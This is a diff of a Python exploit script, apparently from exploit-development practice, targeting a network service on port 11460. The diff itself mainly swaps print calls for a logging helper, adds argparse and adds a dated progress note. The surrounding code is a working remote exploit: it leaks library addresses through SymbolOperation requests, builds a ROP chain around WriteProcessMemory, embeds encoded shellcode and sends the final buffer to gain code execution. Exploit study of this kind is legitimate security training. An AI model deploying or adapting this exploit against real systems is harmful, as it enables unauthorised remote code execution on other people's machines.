@@ -205,10 +205,16 @@ recover knowledge
     - FXCLI_OraBR_Exec_Command is used to send the final buffer to 
       the server, which will trigger the ROP chain and execute the shellcode
 
+2258-02082026:
+- Got my desk setup, do not have enough time to get much work done however
+- Ran the script, got 0x42424242 on EIP, unsure what part of the 42 chain is on EIP
+- rest for tomorrow
+
 =============================================================================
 
 """
 
+import argparse
 import socket
 import sys
 from struct import pack
@@ -223,6 +229,20 @@ init()
 
 
 bad_chars = [0x00, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x20]
+
+
+def log(msg: str, indent: int = 0, level: str = "*"):
+    """Prints a message with a given indentation and log level."""
+    indent_str = "\t" * indent
+    level_map = {
+        "+": ("[+]", Fore.GREEN),
+        "-": ("[-]", Fore.RED),
+        "!": ("[!]", Fore.YELLOW),
+        "!!!": ("[!!!]", Fore.LIGHTRED_EX),
+        "*": ("[*]", Fore.CYAN),
+    }
+    prefix, color = level_map.get(level, (f"[{level}]", Fore.WHITE))
+    print(f"{color}{indent_str}{prefix} {msg}{Style.RESET_ALL}")
 
 
 def checkBadChars(data):
@@ -242,23 +262,23 @@ def sendMalBuff(buf, socketTup):
 
             # Check buffer for bad chars
             if checkBadChars(buf):
-                print(Fore.RED + Back.WHITE + "[WARN] Buffer contains bad characters" + Style.RESET_ALL)
+                log("Buffer contains bad characters", level="!")
 
             # Send the buffer to the server
             s.sendall(buf)
             if DEBUG:
                 printBuffer(buf, width="dd")
-                print(f"{Fore.GREEN}o Sent {len(buf)} bytes successfully!{Style.RESET_ALL}")
+                log(f"Sent {len(buf)} bytes successfully!", level="+")
 
             # Print out response from server
             if DEBUG:
-                print(Fore.CYAN + f"o Waiting for response from server..." + Style.RESET_ALL)
+                log("Waiting for response from server...", level="*")
             response = b""
             while True:
                 try:
                     chunk = s.recv(1024)
                     if DEBUG:
-                        print(f"{Fore.YELLOW}Received chunk: {chunk}{Style.RESET_ALL}")
+                        log(f"Received chunk: {chunk}", level="!!!")
                 except socket.timeout:
                     break
                 if not chunk:
@@ -268,23 +288,23 @@ def sendMalBuff(buf, socketTup):
                     break
 
             if not response:
-                print(Fore.RED + "[!] No response received from server" + Style.RESET_ALL)
+                log("No response received from server", level="-")
                 sys.exit(1)
 
             return response
 
     except socket.timeout:
-        print(Fore.RED + "[!] Socket operation timed out" + Style.RESET_ALL)
+        log("Socket operation timed out", level="-")
         sys.exit(1)
     except socket.error as error:
-        print(Fore.RED + f"[!] Socket error: {error}" + Style.RESET_ALL)
+        log(f"Socket error: {error}", level="-")
         sys.exit(1)
 
 
 def leakFunctionAddress(func, socketTup):
 
     if DEBUG:
-        print(Fore.CYAN + f"o Attempting to leak address for {func.decode('utf-8').strip(chr(0))}..." + Style.RESET_ALL)
+        log(f"Attempting to leak address for {func.decode('utf-8').strip(chr(0))}...", level="*")
     # Append SymbolOperation to the Func
     symOpFunc = b"SymbolOperation" + func
 
@@ -314,13 +334,13 @@ def leakFunctionAddress(func, socketTup):
     if response:
         # Should have a valid response, parse it and get the address
         functionAddress = parseResponse(response)
-        print(Fore.GREEN + f"o Leaked {func.decode('utf-8').strip(chr(0))}: {Fore.LIGHTYELLOW_EX} 0x{functionAddress:08x}" + Style.RESET_ALL)
+        log(f"Leaked {func.decode('utf-8').strip(chr(0))}: 0x{functionAddress:08x}", level="+")
 
         if functionAddress == 1:
-            print(Fore.RED + f"[!] Failed to leak address for {func.decode('utf-8').strip(chr(0))}" + Style.RESET_ALL)
+            log(f"Failed to leak address for {func.decode('utf-8').strip(chr(0))}", level="-")
             sys.exit(1)
     else:
-        print(Fore.RED + f"[!] No response received from server when leaking {func.decode('utf-8').strip(chr(0))}" + Style.RESET_ALL)
+        log(f"No response received from server when leaking {func.decode('utf-8').strip(chr(0))}", level="-")
         sys.exit(1)
     # Return the address only
     return functionAddress
@@ -337,7 +357,7 @@ def printBuffer(buf, width="db"):
         w = 4
         groups_per_line = 4
     else:
-        print(f"ERR: Invalid width {width}")
+        log(f"Invalid width {width}", level="-")
         exit(-1)
     bytes_per_line = groups_per_line * w
     for i in range(0, len(buf), bytes_per_line):
@@ -400,21 +420,24 @@ def parseResponse(response):
         if line.find(pattern) != -1:
             address = int((line.split(pattern)[-1].strip()), 16)
     if not address:
-        print("[!] Could not find the address in the Response")
+        log("Could not find the address in the Response", level="-")
         sys.exit()
     return address
 
 
+def parse_args():
+    parser = argparse.ArgumentParser(description="Send a crafted buffer to the target service")
+    parser.add_argument("ip", help="Target IP address")
+    return parser.parse_args()
+
+
 def main():
     global BASE_ADDR_BAD
-    if len(sys.argv) != 2:
-        print(f"ERR: No ip addr provided")
-        exit(-1)
-
-    server = sys.argv[1]
+    args = parse_args()
+    server = args.ip
     port = 11460
 
-    print(Fore.CYAN + f"o IP Addr: {server}:{port}" + Style.RESET_ALL)
+    log(f"IP Addr: {server}:{port}", level="*")
 
     try:
         functions = [b"N98E_CRYPTO_get_new_lockid" + b"\x00", b"WriteProcessMemory" + b"\x00"]
@@ -438,10 +461,9 @@ def main():
         functionOffset = 0x14E0
 
         libeay32ibm019 = exportedFunc - functionOffset
-        print(
-            Fore.GREEN
-            + f"o Calculated library base via\n\t\t {functions[0].decode('utf-8')}: {Fore.LIGHTYELLOW_EX}{str(hex(libeay32ibm019))}"
-            + Style.RESET_ALL
+        log(
+            f"Calculated library base via\n\t\t{functions[0].decode('utf-8')}: {str(hex(libeay32ibm019))}",
+            level="+",
         )
 
         """
@@ -524,7 +546,7 @@ def main():
         # DD 0D 08 D6   <- this broke the flow, got 00 00 08 D6
 
         # eip = pack("<L", (0xDD0D08D6))  # push esp; pop esi; ret <- Save ESP to ESI
-        print(f"{Fore.GREEN}! DEBUG: eip: {Fore.YELLOW}{hex(libeay32ibm019 + 0x000408D6)}{Style.RESET_ALL}")
+        log(f"DEBUG: eip: {hex(libeay32ibm019 + 0x000408D6)}", level="!!!")
 
         """
         ************************************************************************************
@@ -622,7 +644,7 @@ def main():
         #          which is not available in this case as WPM restores the default protections which were read/exec
         offset2 = b"C" * (0x600 - len(rop))  # This was calculated by subtracting lpBuffer address to the end of our ROP chain
         shellcode = getShellcode(encoded=True)[:20]  # Get encoded shellcode, moving forward we will be using the encoded shellcode
-        print(f"{Fore.GREEN}o Encoded Shellcode {Style.RESET_ALL}")
+        log("Encoded Shellcode", level="+")
         printBuffer(shellcode, width="db")
 
         # SHELLCODE ENCODING:
@@ -638,19 +660,17 @@ def main():
 
         # Warn Base Address(es) might be bad
         if BASE_ADDR_BAD:
-            print(
-                Fore.RED
-                + Back.WHITE
-                + "[WARN] One or more leaked addresses contain bad characters, base address calculations may be incorrect"
-                + Style.RESET_ALL
+            log(
+                "One or more leaked addresses contain bad characters, base address calculations may be incorrect",
+                level="!",
             )
 
         # Send Final Buffer
-        print(f"{Fore.CYAN}o Sending final buffer...{Style.RESET_ALL}")
+        log("Sending final buffer...", level="*")
         sendMalBuff(buf, (server, port))
 
     except KeyboardInterrupt:
-        print(Fore.RED + "\n[!] User requested shutdown" + Style.RESET_ALL)
+        log("User requested shutdown", level="-")
         return 1
 
 
